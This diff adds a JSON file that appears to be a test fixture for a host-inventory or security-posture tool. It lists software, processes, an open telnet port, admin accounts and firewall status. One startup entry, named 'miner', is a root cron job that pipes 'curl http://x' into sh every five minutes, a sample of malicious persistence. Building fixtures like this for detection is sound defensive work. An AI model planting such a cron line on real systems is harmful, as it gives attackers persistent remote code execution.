@@ -1,0 +1,101 @@
+{
+  "items": [
+    {
+      "hash": "7bfac2a9589ddfde",
+      "source": "software",
+      "item": {
+        "Name": "AnyDesk",
+        "Version": "8.0.9",
+        "Publisher": null,
+        "Source": "registry"
+      },
+      "key": "d1b575c642a3bcc0"
+    },
+    {
+      "hash": "5f1ad473726307af",
+      "source": "software",
+      "item": {
+        "Name": "Zażółć gęślą 7-Zip",
+        "Version": "24.09",
+        "Publisher": "Igor Pavlov",
+        "Source": "registry (user)"
+      },
+      "key": "6018182e2f70c8ae"
+    },
+    {
+      "hash": "eb4b70290ac7d174",
+      "source": "processes",
+      "item": {
+        "Name": "bash",
+        "Path": "/usr/bin/bash",
+        "CommandLine": "bash -c \"echo $HOME | cat\"",
+        "User": "root",
+        "Count": 3
+      },
+      "key": "ee8653da952f00c3"
+    },
+    {
+      "hash": "74b33c5c7ceadff0",
+      "source": "listening",
+      "item": {
+        "Protocol": "tcp",
+        "Address": "0.0.0.0",
+        "Port": 23,
+        "Process": "telnetd",
+        "Path": null
+      },
+      "key": "45f58a14772f376a"
+    },
+    {
+      "hash": "0529b4bc07a48d68",
+      "source": "startup",
+      "item": {
+        "Name": "miner",
+        "Command": "*/5 * * * * root curl -fsSL http://x | sh",
+        "Location": "/etc/cron.d/miner:1",
+        "User": null
+      },
+      "key": "1d2ab80cdb79b391"
+    },
+    {
+      "hash": "08be254a5ebc05f2",
+      "source": "admins",
+      "item": {
+        "Name": "CORP\\Eve",
+        "Source": "Domain",
+        "Enabled": true
+      },
+      "key": "e68af2dbf3ee1b92"
+    },
+    {
+      "hash": "3e19f8a15365b445",
+      "source": "admins",
+      "item": {
+        "Name": "Administrator",
+        "Source": "Local",
+        "Enabled": false
+      },
+      "key": "4194d1706ed1f408"
+    },
+    {
+      "hash": "abba9ebe4f54506e",
+      "source": "posture",
+      "item": {
+        "FirewallEnabled": false,
+        "AntivirusName": "Defender",
+        "SecureBoot": true,
+        "DaysSinceUpdate": 12,
+        "SshRootLogin": "prohibit-password"
+      },
+      "key": "posture"
+    }
+  ],
+  "states": {
+    "startup": "a95be41cf677039c2501c8d515b85f94e15dfa4da6bf16a4264ee592922aa177",
+    "software": "5b71ced3bf8cd6b9ec960df91eae1d2a7ace2cd4c7925c880382c4e498483597",
+    "posture": "3a57d971de08151d978823b7ef3a62aea0a4632d0f373cdbb9b240705714f145",
+    "admins": "5854cfe81062b6f1f12e10285eee93caaa6818abea89fdceba9e9064886800c1",
+    "listening": "de8f0baa5f502f92a1f5e5594c18f9e364626d96d2138af7377cfc14f24a2ea2",
+    "processes": "c1c9a6f4f89496af2b2ddbd2482199a44850bb1b1417bb615b177fb7044d283c"
+  }
+}
